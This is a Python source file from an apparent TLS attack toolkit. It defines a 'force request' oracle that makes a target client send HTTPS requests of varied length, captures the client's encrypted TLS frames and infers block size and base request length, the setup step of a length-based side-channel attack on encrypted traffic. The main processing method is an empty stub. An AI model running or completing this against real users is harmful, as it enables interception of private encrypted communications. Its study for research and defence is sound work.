import logging

from tls_attack.structure.TLSHeader import *
from tls_attack.structure.TLSSource import *

class ForceRequestOracle:
    TLS_HISTORY_LENGTH = 20
    INIT_STEP_COUNT    = 65

    def __init__(self, force_request, https_server, target_client_ip, target_server_host):
        self.force_request = force_request
        self.https_server = https_server
        self.is_started = False
        self.ready = False
        self.queue = []
        self.tls_frames = []
        self.target_ip = target_client_ip
        self.base_url = b"https://" + target_server_host

    def start(self):
        if not self.is_started:
            self.https_server.on_packet_received(self._https_handler)
            self.force_request.start()
            self.https_server.start()
            self.is_started = True
            self._init()

    # This initialization step is to correctly map the force request
    # to the right TLS encrypted frame. We will force a few request of
    # different length to identify it properly.
    def _init(self):
        logging.info("Initializing the force request oracle.")

        self._init_step = 0
        self._init_stats = []
        self._init_step_fct()

    def _init_step_fct(self):
        # Reset the data
        self.tls_frames = []

        # Force the next request
        self._init_step += 1
        self.force_request.force_request(self.target_ip, self.base_url + b"/" + b"A"*self._init_step, callback = self._init_callback)

    def _init_callback(self, id):
        for frame in self.tls_frames:
            self._init_stats.append({ "step" : self._init_step, "length" : frame.length })

        print("Frames %d" % self._init_step)
        print(self.tls_frames)

        if self._init_step < ForceRequestOracle.INIT_STEP_COUNT:
            self._init_step_fct()
        else:
            self._init_analyze()

    def _init_analyze(self):
        def filter_step(step):
            def f(item):
                return item["step"] == step

            return [a for a in filter(f, self._init_stats)]

        min_step = 8 * 4
        previous = filter_step(1)

        # We first identify the block size
        for i in range(2, ForceRequestOracle.INIT_STEP_COUNT + 1):
            current = filter_step(i)

            for el_current in current:
                for el_previous in previous:
                    diff = el_current["length"] - el_previous["length"]

                    if diff > 0 and diff < min_step:
                        min_step = diff

            # We have already correctly identify the block length at this point
            if i > min_step*2:
                break

        self.block_size = min_step

        # We identify the request which increases by exactly the block size.
        baseline =  filter_step(1)
        one_block = filter_step(1 + 1*self.block_size)
        two_block = filter_step(1 + 2*self.block_size)

        base_size = -1

        for el_baseline in baseline:
            found = False

            for el_one_block in one_block:
                if el_one_block["length"] - el_baseline["length"] == self.block_size:
                    found = True
                    break

            if not found:
                continue

            for el_two_block in two_block:
                if el_two_block["length"] - el_baseline["length"] == 2*self.block_size:
                    found = True
                    break

            if found:
                base_size = el_baseline["length"] 
                break

        # We identify the boundary to determine the exact length of the message
        boundary = -1

        for i in range(2, self.block_size + 1):
            for el_current in filter_step(i):
                if el_current["length"] == base_size + self.block_size:
                    boundary = i
                    break

            if not boundary == -1:
                break

        # This value indicates the length of the request forced with and empty
        # URL and empty POST data.
        self.base_length = base_size - boundary

        print(self.base_length, boundary, self.block_size)

    def force(self, url, post_data, callback):
        self.queue.append({ "url" : url, "post_data" : post_data, "callback" : callback })

        # If we are not ready or there's already an element being
        # processed, we just wait.
        if self.ready and len(self.queue) == 1:
            self._process_next()

    def _process_next(self):
        pass

    def _https_handler(self, connection, structure, state, source):
        if source == TLSSource.CLIENT and structure.content_type == TLSContentType.TLSApplicationData.value:
            self.tls_frames.append(structure)
            self.tls_frames = self.tls_frames[-ForceRequestOracle.TLS_HISTORY_LENGTH:]

